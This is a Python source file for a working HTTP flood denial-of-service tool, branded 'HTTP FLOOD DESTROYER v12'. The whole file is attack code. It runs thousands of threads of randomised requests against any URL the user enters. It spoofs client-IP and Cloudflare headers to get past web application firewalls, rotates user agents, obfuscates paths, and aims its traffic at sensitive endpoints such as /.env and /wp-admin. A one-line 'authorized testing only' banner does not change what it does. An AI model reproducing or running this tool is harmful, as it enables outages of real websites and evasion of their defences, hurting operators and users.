import urllib.request
import concurrent.futures
import random
import os
import time
import socket
import ssl
from colorama import Fore, Style
import threading
import faker
from fake_useragent import UserAgent
import string
from urllib.parse import urlparse
import base64
import json

class AdvancedHTTPFlooder:
    """
    HTTP Flood Tester PRO v12 - Ultimate Destroyer
    Focused purely on advanced HTTP Flood attacks with maximum efficiency
    """

    def __init__(self):
        # Enhanced configuration
        self.config = {
            'VERSION': "12.0 DESTROYER",
            'AUTHOR': "CyberSecurity Research Team",
            'MAX_THREADS': 1000,
            'REQUEST_TIMEOUT': 5,
            'MAX_REQUESTS': 10000,
            'SAFE_MODE': False,
            'DYNAMIC_THROTTLING': True,
            'ATTACK_DURATION': 300,
            'WAF_EVASION': True,
            'OBFUSCATION': True,
            'TARGETED_ATTACK': True
        }

        # Libraries initialization
        self.fake = faker.Faker()
        self.ua = UserAgent()
        self.context = ssl.create_default_context()
        self.context.check_hostname = False
        self.context.verify_mode = ssl.CERT_NONE

        # Attack state
        self.counter = 0
        self.running = False
        self.start_time = 0
        self.lock = threading.Lock()
        self.adaptive_delay = 0.05

        # Target paths for maximum damage
        self.target_paths = [
            "/wp-admin/admin-ajax.php",
            "/.env",
            "/config.json",
            "/api/v1/users",
            "/phpmyadmin/index.php",
            "/administrator/index.php"
        ]

    # ================= Enhanced Utility Methods =================

    def generate_random_string(self, length=12):
        """Generate random string with special chars"""
        chars = string.ascii_letters + string.digits + "_-~."
        return ''.join(random.choice(chars) for _ in range(length))

    def get_rotating_user_agent(self):
        """Get fresh user agent for each request"""
        return self.ua.random

    def generate_evasive_path(self):
        """Generate paths with focus on vulnerable targets"""
        if self.config['TARGETED_ATTACK'] and random.random() < 0.4:
            path = random.choice(self.target_paths)
            if random.random() < 0.3:
                path = base64.b64encode(path.encode()).decode()
            return path

        # Generate complex random path
        depths = random.randint(1, 5)
        parts = [self.generate_random_string(random.randint(3, 10)) for _ in range(depths)]
        path = '/' + '/'.join(parts)

        if self.config['OBFUSCATION']:
            path = base64.b64encode(path.encode()).decode()

        return path

    def generate_evasive_headers(self, host):
        """Generate highly randomized HTTP headers"""
        headers = {
            "User-Agent": self.get_rotating_user_agent(),
            "Accept": "*/*",
            "Accept-Language": f"{random.choice(['en','ar','fr','es'])}-{random.choice(['US','GB','SA','FR'])}",
            "Accept-Encoding": random.choice(["gzip, deflate, br", "identity"]),
            "Connection": random.choice(["keep-alive", "close"]),
            "Cache-Control": "no-cache, no-store",
            "X-Forwarded-For": self.fake.ipv4(),
            "X-Request-ID": self.generate_random_string(16),
            "X-Real-IP": self.fake.ipv4()
        }

        # Advanced WAF bypass headers
        if self.config['WAF_EVASION']:
            headers.update({
                "CF-Connecting-IP": self.fake.ipv4(),
                "True-Client-IP": self.fake.ipv4(),
                "X-Originating-IP": self.fake.ipv4(),
                "Forwarded": f"for={self.fake.ipv4()};proto=https"
            })

            # Random Cloudflare headers
            if random.random() < 0.2:
                headers.update({
                    "CF-IPCountry": random.choice(["US", "GB", "DE"]),
                    "CF-Ray": f"{random.randint(100000, 999999)}-{random.choice(['SIN','LHR','DFW'])}"
                })

        return headers

    # ================= Core Attack Method =================

    def execute_http_flood(self, target):
        """Execute optimized HTTP flood attack"""
        if not self.running:
            return

        try:
            parsed = urlparse(target)
            host = parsed.netloc
            path = self.generate_evasive_path()

            # Protocol randomization
            protocol = "https" if random.random() > 0.4 else "http"
            url = f"{protocol}://{host}{path}"

            # Parameter randomization with obfuscation
            if random.random() > 0.1:
                if self.config['OBFUSCATION']:
                    param = base64.b64encode(self.generate_random_string().encode()).decode()
                    value = base64.b64encode(self.generate_random_string().encode()).decode()
                    url += f"?{param}={value}"
                else:
                    url += f"?{self.generate_random_string()}={self.generate_random_string()}"

                if random.random() > 0.5:
                    url += f"&_={int(time.time())}"

            # Method randomization
            method = random.choice(["GET", "POST", "HEAD", "PUT", "DELETE"])

            # Build request
            req = urllib.request.Request(
                url,
                headers=self.generate_evasive_headers(host),
                method=method
            )

            # Add random POST data
            if method in ["POST", "PUT"]:
                post_data = {
                    self.generate_random_string(5): self.generate_random_string(8),
                    "timestamp": int(time.time()),
                    "token": self.generate_random_string(12)
                }
                req.data = urllib.parse.urlencode(post_data).encode()

            try:
                with urllib.request.urlopen(req, timeout=self.config['REQUEST_TIMEOUT'], context=self.context) as res:
                    status = res.status
            except urllib.error.HTTPError as e:
                status = e.code
            except:
                status = 0

            # Adaptive throttling
            if self.config['DYNAMIC_THROTTLING']:
                if status == 429:  # Rate limited
                    self.adaptive_delay = min(1.0, self.adaptive_delay * 1.2)
                elif status == 200:
                    self.adaptive_delay = max(0.01, self.adaptive_delay * 0.95)

            with self.lock:
                self.counter += 1
                self.display_status(status)

        except Exception as e:
            pass

    # ================= Attack Control Methods =================

    def attack_worker(self, target):
        """Worker thread for optimized HTTP flood"""
        while self.running and time.time() < self.start_time + self.config['ATTACK_DURATION']:
            self.execute_http_flood(target)
            if self.config['DYNAMIC_THROTTLING']:
                time.sleep(self.adaptive_delay)

    # ================= Monitoring and Control =================

    def display_status(self, last_status):
        """Display real-time attack statistics"""
        elapsed = time.time() - self.start_time
        remaining = max(0, self.config['ATTACK_DURATION'] - elapsed)
        rps = self.counter / elapsed if elapsed > 0 else 0

        status_msg = (
            f"{Fore.CYAN}[STATUS]{Fore.RESET} "
            f"Threads: {Fore.YELLOW}{self.config['MAX_THREADS']}{Fore.RESET} | "
            f"Requests: {Fore.GREEN}{self.counter}{Fore.RESET} | "
            f"RPS: {Fore.MAGENTA}{rps:.1f}{Fore.RESET} | "
            f"Last: {Fore.CYAN}{last_status}{Fore.RESET} | "
            f"Delay: {Fore.YELLOW}{self.adaptive_delay:.2f}s{Fore.RESET} | "
            f"Remaining: {Fore.RED}{remaining:.1f}s{Fore.RESET}"
        )
        print(status_msg, end='\r')

    def get_user_settings(self):
        """Get custom settings from user"""
        try:
            # Threads setting
            threads = input(f"{Fore.BLUE}[?] Enter number of threads (default {self.config['MAX_THREADS']}): {Fore.RESET}").strip()
            if threads:
                self.config['MAX_THREADS'] = min(5000, int(threads))

            # Duration setting
            duration = input(f"{Fore.BLUE}[?] Enter attack duration in seconds (default {self.config['ATTACK_DURATION']}): {Fore.RESET}").strip()
            if duration:
                self.config['ATTACK_DURATION'] = int(duration)

            # Advanced options
            adv = input(f"{Fore.BLUE}[?] Enable advanced evasion? (WAF bypass, obfuscation) [Y/n]: {Fore.RESET}").strip().lower()
            if adv == 'n':
                self.config['WAF_EVASION'] = False
                self.config['OBFUSCATION'] = False

            target_mode = input(f"{Fore.BLUE}[?] Focus on vulnerable paths? (wp-admin, .env etc) [Y/n]: {Fore.RESET}").strip().lower()
            self.config['TARGETED_ATTACK'] = target_mode != 'n'

        except ValueError:
            print(f"{Fore.YELLOW}[!] Invalid input, using defaults{Fore.RESET}")

    def start_attack(self, target):
        """Start the optimized HTTP flood attack"""
        self.display_banner()
        self.get_user_settings()

        if not self.validate_target(target):
            print(f"{Fore.RED}[!] Invalid target URL{Fore.RESET}")
            return

        print(f"\n{Fore.YELLOW}[*] Initializing ULTIMATE HTTP FLOOD against: {target}{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Configuration: {self.config['MAX_THREADS']} threads, {self.config['ATTACK_DURATION']} seconds{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Advanced features: WAF Evasion={self.config['WAF_EVASION']}, Obfuscation={self.config['OBFUSCATION']}{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Targeted attack: {self.config['TARGETED_ATTACK']}{Fore.RESET}")

        self.running = True
        self.start_time = time.time()

        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.config['MAX_THREADS']) as executor:
                futures = [executor.submit(self.attack_worker, target) 
                          for _ in range(self.config['MAX_THREADS'])]

                while (self.running and 
                       time.time() < self.start_time + self.config['ATTACK_DURATION']):
                    time.sleep(0.5)
                    if self.config['DYNAMIC_THROTTLING']:
                        time.sleep(self.adaptive_delay)

                self.running = False
                concurrent.futures.wait(futures)

        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Fore.RED}[!] Attack stopped by user{Fore.RESET}")

        finally:
            self.display_summary()

    # ================= UI and Helpers =================

    def validate_target(self, url):
        """Validate the target URL"""
        try:
            result = urlparse(url)
            return all([result.scheme in ['http','https'], result.netloc])
        except:
            return False

    def display_banner(self):
        """Display the program banner"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{Fore.RED}
        ██╗  ██╗████████╗████████╗██████╗ ██╗     ██████╗  ██████╗ 
        ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗██║     ██╔══██╗██╔═══██╗
        ███████║   ██║      ██║   ██████╔╝██║     ██████╔╝██║   ██║
        ██╔══██║   ██║      ██║   ██╔═══╝ ██║     ██╔═══╝ ██║   ██║
        ██║  ██║   ██║      ██║   ██║     ███████╗██║     ╚██████╔╝
        ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝     ╚══════╝╚═╝      ╚═════╝ 
        {Fore.RESET}{"HTTP FLOOD DESTROYER v12".center(60)}
        {Fore.CYAN}Version: {self.config['VERSION']} (For Authorized Testing Only){Fore.RESET}
        {Fore.YELLOW}WARNING: Unauthorized use is illegal!{Fore.RESET}
        """)

    def display_summary(self):
        """Display attack summary"""
        elapsed = time.time() - self.start_time
        rps = self.counter / elapsed if elapsed > 0 else 0

        print(f"\n\n{Fore.GREEN}[+] Attack completed{Fore.RESET}")
        print(f"{Fore.YELLOW}╔{'═'*60}╗")
        print(f"║ {'Ultimate HTTP Flood Summary'.center(58)} ║")
        print(f"╠{'═'*60}╣")
        print(f"║ {f'Target: {self.target}'.ljust(58)} ║")
        print(f"║ {f'Total Requests: {self.counter}'.ljust(58)} ║")
        print(f"║ {f'Duration: {elapsed:.2f} seconds'.ljust(58)} ║")
        print(f"║ {f'Requests Per Second: {rps:.2f}'.ljust(58)} ║")
        print(f"║ {f'Max Threads Used: {self.config["MAX_THREADS"]}'.ljust(58)} ║")
        print(f"║ {f'WAF Evasion: {"Enabled" if self.config["WAF_EVASION"] else "Disabled"}'.ljust(58)} ║")
        print(f"║ {f'Targeted Attack: {"Enabled" if self.config["TARGETED_ATTACK"] else "Disabled"}'.ljust(58)} ║")
        print(f"╚{'═'*60}╝\n")

# ================= Main Execution =================

if __name__ == "__main__":
    tester = AdvancedHTTPFlooder()

    # Get target URL safely
    while True:
        target = input(f"{Fore.BLUE}[?] Enter target URL (http(s)://example.com) or 'exit': {Fore.RESET}").strip()
        if target.lower() == 'exit':
            break
        if tester.validate_target(target):
            tester.target = target
            tester.start_attack(target)
            break
        print(f"{Fore.RED}[!] Invalid URL format. Include http:// or https://{Fore.RESET}")